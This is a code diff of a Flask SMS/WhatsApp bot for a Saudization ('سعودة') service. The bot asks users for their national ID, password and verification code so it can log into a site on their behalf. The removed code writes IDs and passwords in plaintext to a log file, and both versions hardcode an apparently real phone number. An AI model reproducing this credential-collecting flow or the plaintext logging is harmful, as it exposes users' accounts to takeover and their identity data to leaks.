@@ -1,54 +1,47 @@
-from flask import Flask, request
-from twilio.twiml.messaging_response import MessagingResponse
 import os
-import datetime
+import requests
+from flask import Flask, request
+from datetime import datetime
 
 app = Flask(__name__)
 
-# الحالة لتتبع المحادثة
-session_state = {}
+USER_PHONE_NUMBER = os.getenv("USER_PHONE_NUMBER", "+967780952606")
+TWILIO_PHONE_NUMBER = os.getenv("TWILIO_PHONE_NUMBER", "+14155238886")
 
-@app.route("/sms", methods=['POST'])
-def sms_reply():
-    sender = request.form.get('From')
-    msg = request.form.get('Body').strip()
-    resp = MessagingResponse()
+log_file = "requests_log.txt"
 
-    if sender not in session_state:
-        session_state[sender] = {"step": 0}
+@app.route("/whatsapp", methods=["POST"])
+def whatsapp_bot():
+    incoming_msg = request.form.get("Body", "").strip().lower()
+    sender = request.form.get("From", "")
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    step = session_state[sender]["step"]
+    reply = ""
 
-    if msg.lower() == "سعودة":
-        session_state[sender]["step"] = 1
-        resp.message("✅ أرسل رقم الهوية وكلمة المرور بالشكل التالي:\n1234567890, password123")
-    
-    elif step == 1:
-        if "," in msg:
-            try:
-                nid, pwd = [x.strip() for x in msg.split(",", 1)]
-                session_state[sender]["nid"] = nid
-                session_state[sender]["pwd"] = pwd
-                session_state[sender]["step"] = 2
-
-                # تسجّل الطلب في ملف
-                with open("requests_log.txt", "a") as f:
-                    f.write(f"[{datetime.datetime.now()}] {sender} => {nid}, {pwd}\n")
-
-                resp.message("📨 تم استلام البيانات بنجاح ✅\nالرجاء الانتظار جاري تسجيل الدخول...")
-
-                # تقدر هنا تنادي API داخلي يسوي السعودة أو يربط بـ Selenium
-                # مثال: send_to_saudabot(nid, pwd)
-
-            except Exception as e:
-                resp.message("❌ يوجد خطأ في التنسيق.\nيرجى كتابة البيانات كالتالي:\n1234567890, password123")
-        else:
-            resp.message("⚠️ يجب كتابة رقم الهوية وكلمة المرور مفصولة بـ (,)")
-
+    if "سعودة" in incoming_msg:
+        reply = "📝 أرسل رقم الهوية:"
+        log_request("طلب سعودة", sender, now)
+    elif incoming_msg.isdigit() and len(incoming_msg) == 10:
+        reply = "🔑 أرسل كلمة المرور:"
+        log_request(f"الهوية: {incoming_msg}", sender, now)
+    elif "pass" in incoming_msg or "كلمه" in incoming_msg:
+        reply = "⏳ جاري تسجيل الدخول للموقع..."
+        log_request(f"كلمة مرور مستلمة", sender, now)
+    elif "كود" in incoming_msg:
+        reply = "✅ تم استلام كود التحقق. جاري إكمال السعودة..."
+        log_request("كود تحقق", sender, now)
     else:
-        resp.message("👋 مرحبًا بك في بوت السعودة.\nأرسل كلمة *سعودة* للبدء.")
+        reply = "👋 مرحباً! أرسل 'سعودة' للبدء."
 
-    return str(resp)
+    send_whatsapp_reply(sender, reply)
+    return "OK", 200
+
+def log_request(content, sender, timestamp):
+    with open(log_file, "a") as f:
+        f.write(f"{timestamp} - {sender}: {content}\n")
+
+def send_whatsapp_reply(to, body):
+    print(f"Reply to {to}: {body}")  # محاكاة إرسال الرسالة
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
